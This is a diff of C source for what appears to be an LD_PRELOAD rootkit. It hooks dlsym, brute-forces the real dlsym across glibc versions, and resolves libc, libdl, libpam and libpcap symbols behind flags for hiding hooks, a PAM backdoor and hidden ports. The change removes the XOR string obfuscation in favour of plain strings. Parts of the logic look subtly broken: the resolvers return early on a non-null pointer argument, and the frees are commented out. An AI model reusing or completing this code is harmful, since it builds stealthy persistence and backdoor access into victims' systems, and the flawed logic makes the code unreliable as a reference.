@@ -1,73 +1,61 @@
-void *xdlopen(const char *filename){
-    void *ret;
-    xor(_filename, filename);
-    ret = dlopen(filename, RTLD_LAZY);
-    clean(_filename);
-    return ret;
-}
-
-void get_libc_symbol(const char *symbol, void **funcptr)
-{
+void get_libc_symbol(const char *symbol, void **funcptr){
     if(funcptr != NULL) return;
 
-    libc_handle = xdlopen(LIBC_PATH);
-    for(int i = 0; i < LIBC_CALLS_SIZE; i++)
-    {
-        if(!xstrncmp(symbol, libc_calls[i])){
+    libc_handle = dlopen(LIBC_PATH, RTLD_LAZY);
+    for(int i = 0; i < LIBC_CALLS_SIZE; i++){
+        char *curcall = libc_calls[i];
+
+        if(!strncmp(symbol, curcall, strlen(curcall))){
             *funcptr = o_dlsym(libc_handle, symbol);
             break;
         }
     }
-    (void)dlclose(libc_handle);
 }
 
-void get_libdl_symbol(const char *symbol, void **funcptr)
-{
+void get_libdl_symbol(const char *symbol, void **funcptr){
     if(funcptr != NULL) return;
 
-    libdl_handle = xdlopen(LIBDL_PATH);
-    for(int i = 0; i < LIBDL_CALLS_SIZE; i++)
-    {
-        if(!xstrncmp(symbol, libdl_calls[i])){
+    libdl_handle = dlopen(LIBDL_PATH, RTLD_LAZY);
+    for(int i = 0; i < LIBDL_CALLS_SIZE; i++){
+        char *curcall = libdl_calls[i];
+
+        if(!strncmp(symbol, curcall, strlen(curcall))){
             *funcptr = o_dlsym(libdl_handle, symbol);
             break;
         }
     }
-    (void)dlclose(libdl_handle);
 }
 
 #if defined(HIDE_HOOKS) && \
     defined(USE_PAM_BD)
-void get_libpam_symbol(const char *symbol, void **funcptr)
-{
+void get_libpam_symbol(const char *symbol, void **funcptr){
     if(funcptr != NULL) return;
 
-    libpam_handle = xdlopen(LIBPAM_PATH);
-    for(int i = 0; i < LIBPAM_CALLS_SIZE; i++)
-    {
-        if(!xstrncmp(libpam_calls[i], symbol)){
+    libpam_handle = dlopen(LIBPAM_PATH, RTLD_LAZY);
+    for(int i = 0; i < LIBPAM_CALLS_SIZE; i++){
+        char *curcall = libpam_calls[i];
+
+        if(!strncmp(symbol, curcall, strlen(curcall))){
             *funcptr = o_dlsym(libpam_handle, symbol);
             break;
         }
     }
-    (void)dlclose(libpam_handle);
 }
 #endif
 
 #ifdef HIDE_PORTS
-void get_libpcap_symbol(const char *symbol, void **funcptr)
-{
+void get_libpcap_symbol(const char *symbol, void **funcptr){
     if(funcptr != NULL) return;
 
-    libpcap_handle = xdlopen(LIBPCAP_PATH);
-    for(int i = 0; i < LIBPCAP_CALLS_SIZE; i++)
-    {
-        if(!xstrncmp(libpcap_calls[i], symbol)){
+    libpcap_handle = dlopen(LIBPCAP_PATH, RTLD_LAZY);
+    for(int i = 0; i < LIBPCAP_CALLS_SIZE; i++){
+        char *curcall = libpcap_calls[i];
+
+        if(!strncmp(symbol, curcall, strlen(curcall))){
             *funcptr = o_dlsym(libpcap_handle, symbol);
             break;
         }
     }
-    (void)dlclose(libpcap_handle);
 }
 #endif
 
@@ -75,32 +63,31 @@ void locate_dlsym(void){
     if(o_dlsym != NULL) return;
 
     char buf[32];
-    xor(dstr, DLSYM_STR);
-    xor(glibv_str, GLIBC_VER_STR);
-    xor(glibvv_str, GLIBC_VERVER_STR);
+    char *dlsym_str = strdup(DLSYM_STR);
+    char *gvstr = strdup(GLIBC_VER_STR);
+    char *gvvstr = strdup(GLIBC_VERVER_STR);
 
     /* here we essentially are bruteforcing the location of dlsym
      * by iterating through every hypothetically possible version of libc. */
     for(int a = 0; a < GLIBC_MAX_VER; a++){
-        (void)snprintf(buf, sizeof(buf), glibv_str, a);
+        snprintf(buf, sizeof(buf), gvstr, a);
 
-        if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, dstr, buf)))
+        if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, dlsym_str, buf)))
             goto end_locate_dlsym;
     }
 
     for(int a = 0; a < GLIBC_MAX_VER; a++){
         for(int b = 0; b < GLIBC_MAX_VER; b++){
-            (void)snprintf(buf, sizeof(buf), glibvv_str, a, b);
+            snprintf(buf, sizeof(buf), gvvstr, a, b);
 
-            if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, dstr, buf)))
+            if((o_dlsym = (void*(*)(void *handle, const char *name))dlvsym(RTLD_NEXT, dlsym_str, buf)))
                 goto end_locate_dlsym;
         }
     }
 end_locate_dlsym:
-    clean(dstr);
-    clean(glibv_str);
-    clean(glibvv_str);
-    if(o_dlsym == NULL) exit(0);
+    //free(dlsym_str); free(gvstr); free(gvvstr);
+    if(o_dlsym == NULL)
+        exit(0);
 }
 
 void *dlsym(void *handle, const char *symbol){
@@ -124,6 +111,7 @@ void *dlsym(void *handle, const char *symbol){
     get_libpcap_symbol(symbol, &ptr);
 #endif
 
-    if(ptr == NULL) ptr = o_dlsym(handle, symbol);
+    if(ptr == NULL)
+        ptr = o_dlsym(handle, symbol);
     return ptr;
 }
